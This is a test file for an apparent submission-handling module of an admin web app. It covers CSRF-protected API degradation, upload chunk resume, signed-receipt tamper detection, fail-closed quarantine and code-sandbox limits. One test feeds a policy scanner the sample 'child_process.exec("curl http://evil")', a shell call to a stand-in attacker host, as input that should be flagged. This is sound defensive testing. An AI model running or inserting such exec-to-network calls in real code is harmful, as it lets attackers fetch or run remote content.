/**
 * Deborah — Safe File/Code/Oral Submission e2e/security tests (Prompt 44)
 *
 * E2E walk (Prompt 44 §13-15, §19-20):
 *   - API walk (graceful degradation without PostgreSQL): admin page
 *     renders, write paths degrade to 400 'PostgreSQL required'
 *     (CSRF-first), unauthenticated access rejected.
 *   - Media chunk resume + normalize worker contract (pure).
 *   - Signed receipt E2E: build → verify → tamper detection.
 *   - Quarantine fail-closed: empty scan log → unscannable (never accepted).
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { createApp } from '../../server.js';
import CONFIG from '../../src/config/env.js';
import { createRequest, snapshotDb, restoreDb } from '../helpers/setup.js';

let app;
let httpServer;
let agent;
let csrfToken;

beforeAll(async () => {
  snapshotDb();
  const result = await createApp();
  app = result.app;
  httpServer = result.httpServer;
  await new Promise((resolve) => httpServer.listen(0, resolve));

  const supertest = (await import('supertest')).default;
  agent = supertest.agent(app);

  // Login ONCE (paper-custody pattern)
  const page = await agent.get('/admin/login');
  const m = page.text.match(/name="_csrf"\s+value="([^"]+)"/);
  await agent.post('/admin/login').type('form').send({
    username: CONFIG.ADMIN_USER,
    password: CONFIG.ADMIN_PASS,
    _csrf: m ? m[1] : '',
  });
  const dash = await agent.get('/admin/dashboard');
  const t = dash.text.match(/window\.__CSRF_TOKEN\s*=\s*'([^']+)'/);
  csrfToken = t ? t[1] : '';
});

afterAll(async () => {
  restoreDb();
  return new Promise((resolve) => {
    if (httpServer && httpServer.listening) httpServer.close(() => resolve());
    else resolve();
  });
});

async function api(method, path, body, csrf) {
  const r = agent[method](path);
  if (body !== undefined) r.send(body);
  if (csrf) r.set('x-csrf-token', csrf);
  return await r;
}

describe('SafeSubmit — API walk (graceful degradation without PG)', () => {
  it('unauthenticated admin API is rejected (no data leak)', async () => {
    const request = await createRequest(); // fresh, no session cookie
    const r = await request.get('/api/admin/safe-submit/sessions');
    expect([401, 403, 302]).toContain(r.status);
  });

  it('meta endpoint serves constants for admin (even without PG)', async () => {
    const r = await api('get', '/api/admin/safe-submit/meta');
    expect(r.status).toBe(200);
    expect(r.body.kinds).toContain('code');
    expect(r.body.sessionStatus.ACCEPTED).toBe('accepted');
    expect(r.body.codeSandbox.network).toBe('none');
  });

  it('sessions read path returns empty arrays without PG', async () => {
    const r = await api('get', '/api/admin/safe-submit/sessions');
    expect(r.status).toBe(200);
    expect(Array.isArray(r.body.sessions)).toBe(true);
  });

  it('write paths degrade to 400 PostgreSQL required (CSRF-first)', async () => {
    const r = await api('post', '/api/admin/safe-submit/sessions/1/quarantine', { action: 'accept' }, csrfToken);
    expect(r.status).toBe(400);
    expect(r.body.error).toMatch(/PostgreSQL required/i);
  });

  it('listen queue read path returns empty without PG', async () => {
    const r = await api('get', '/api/admin/safe-submit/listen-queue');
    expect(r.status).toBe(200);
    expect(Array.isArray(r.body.transcripts)).toBe(true);
  });

  it('admin page renders for admin', async () => {
    const r = await api('get', '/admin/safe-submit');
    expect(r.status).toBe(200);
    expect(r.text).toMatch(/Safe Submission/);
  });
});

describe('SafeSubmit — media resume + normalize contract (Prompt 44 §13)', () => {
  it('chunk resume: contiguous offset accepted, gap rejected, resend idempotent', async () => {
    const { validateChunk } = await import('../../src/modules/safe-submit/index.js');
    expect(validateChunk({ chunkIndex: 0, offset: 0, size: 100, receivedSize: 0 }).ok).toBe(true);
    expect(validateChunk({ chunkIndex: 1, offset: 200, size: 100, receivedSize: 100 }).ok).toBe(false);
    expect(validateChunk({ chunkIndex: 0, offset: 0, size: 100, receivedSize: 500 }).ok).toBe(true);
  });

  it('normalize worker contract is locked down', async () => {
    const { mediaNormalizeContract } = await import('../../src/modules/safe-submit/index.js');
    const c = mediaNormalizeContract();
    expect(c.mono).toBe(true);
    expect(c.resampleRate).toBe(16000);
    expect(c.maxDurationMs).toBeLessThanOrEqual(60 * 60 * 1000);
  });
});

describe('SafeSubmit — signed receipt E2E (Prompt 44 §10)', () => {
  it('receipt builds, verifies, and detects tampering', async () => {
    const { buildSubmissionReceipt, verifySubmissionReceipt } = await import('../../src/modules/safe-submit/index.js');
    const secret = 'e2e-secret-0123456789abcdefghijklmnopqrstuv';
    const receipt = buildSubmissionReceipt({ attemptId: 42, versionNo: 2, sessionKey: 'sk-e2e', sha256: 'b'.repeat(64), quarantineStatus: 'clean', secret });
    expect(verifySubmissionReceipt(receipt, secret)).toBe(true);
    const tampered = { ...receipt, body: { ...receipt.body, sha256: 'c'.repeat(64) } };
    expect(verifySubmissionReceipt(tampered, secret)).toBe(false);
  });

  it('immutable version history contract (supersede only, never delete)', async () => {
    const { VERSION_STATUS, validateVersionTransition } = await import('../../src/modules/safe-submit/index.js');
    expect(validateVersionTransition(VERSION_STATUS.SUBMITTED, VERSION_STATUS.SUPERSEDED).ok).toBe(true);
    expect(validateVersionTransition(VERSION_STATUS.SUPERSEDED, VERSION_STATUS.SUBMITTED).ok).toBe(false);
  });
});

describe('SafeSubmit — security guards (Prompt 44 §15, §24)', () => {
  it('quarantine is FAIL-CLOSED: empty scan log → unscannable (never accepted)', async () => {
    const { decideQuarantine, QUARANTINE_STATUS } = await import('../../src/modules/safe-submit/index.js');
    expect(decideQuarantine([]).status).toBe(QUARANTINE_STATUS.UNSCANNABLE);
  });

  it('quarantine NEVER becomes a late penalty', async () => {
    const { quarantineNeverPenalty } = await import('../../src/modules/safe-submit/index.js');
    expect(quarantineNeverPenalty().ok).toBe(true);
  });

  it('uploaded code hooks cannot run: static policy + sandbox contract', async () => {
    const { staticCodePolicyCheck, codeSandboxLimits } = await import('../../src/modules/safe-submit/index.js');
    const c = codeSandboxLimits();
    expect(c.network).toBe('none');
    expect(c.filesystem).toMatch(/readonly/);
    const flagged = staticCodePolicyCheck({ source: 'child_process.exec("curl http://evil")' });
    expect(flagged.verdict).toBe('suspicious');
  });
});
